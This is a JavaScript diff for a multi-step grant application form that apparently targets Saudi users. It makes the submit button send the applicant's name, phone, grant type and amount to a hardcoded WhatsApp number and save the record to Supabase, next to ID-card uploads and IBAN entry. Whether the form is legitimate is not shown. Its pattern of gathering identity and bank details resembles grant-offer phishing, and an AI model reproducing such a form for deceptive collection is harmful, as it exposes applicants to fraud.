@@ -267,13 +267,10 @@ function removeFile(id) {
 // ================================
 
 function setupPhoneFormatting() {
-    const phone = document.getElementById('phone');
+    var phone = document.getElementById('phone');
     if (!phone) return;
-    phone.addEventListener('input', function() {
-        let v = this.value.replace(/\D/g, '').slice(0, 10);
-        if (v.length > 0) v = '+966 ' + v.replace(/(\d{2})(\d{3})(\d{4})/, '$1 $2 $3');
-        this.value = v;
-    });
+    // نمسح التنسيق التلقائي تماماً — المستخدم يكتب كما يريد
+    // التحقق يتم فقط عند الانتقال للخطوة التالية
 }
 
 function setupIBANFormatting() {
@@ -290,34 +287,36 @@ function setupIBANFormatting() {
 // ================================
 // FORM SUBMISSION
 // ================================
-
 function setupFormListeners() {
-    const form = document.getElementById('grantForm');
-    if (!form) return;
+    var submitBtn = document.getElementById('submitBtn');
+    if (!submitBtn) return;
 
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
+    submitBtn.addEventListener('click', function() {
         if (!validateStep(5)) return;
 
         saveStepData(5);
-        const txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 10000)).padStart(4, '0');
 
-        // ✅ نفتح WhatsApp فوراً في نفس لحظة الضغط قبل أي await
-        const msg = encodeURIComponent(`مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ${txNumber}`);
-        const waWindow = window.open(`https://wa.me/966545239928?text=${msg}`, '_blank');
+        var txNumber = 'WA-' + new Date().getFullYear() + '-' +
+            String(Math.floor(Math.random() * 10000)).padStart(4, '0');
 
-        // إظهار Modal
+        var msg = encodeURIComponent(
+            'مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ' + txNumber +
+            '\nالاسم: ' + (formData.personalInfo.fullName || '') +
+            '\nالهاتف: ' + (formData.contactCareer.phone || '') +
+            '\nنوع المنحة: ' + (formData.grantDetails.grantType || '') +
+            '\nالمبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
+        );
+        window.open('https://wa.me/966545239928?text=' + msg, '_blank');
+
         document.getElementById('transactionNumber').textContent = txNumber;
         document.getElementById('successModal').classList.add('active');
 
-        // حفظ البيانات في Supabase في الخلفية (لا يوقف الواتساب)
-        saveToSupabase(txNumber).catch(err => console.error('Supabase error:', err));
+        saveToSupabase(txNumber);
 
-        // إعادة تعيين الفورم
-        setTimeout(() => {
-            form.reset();
+        setTimeout(function() {
+            document.getElementById('grantForm').reset();
             formData.attachments = {};
-            ['idCardFront', 'idCardBack'].forEach(id => removeFile(id));
+            ['idCardFront', 'idCardBack'].forEach(function(id) { removeFile(id); });
             document.getElementById('successModal').classList.remove('active');
             currentStep = 1;
             updateProgressBar();
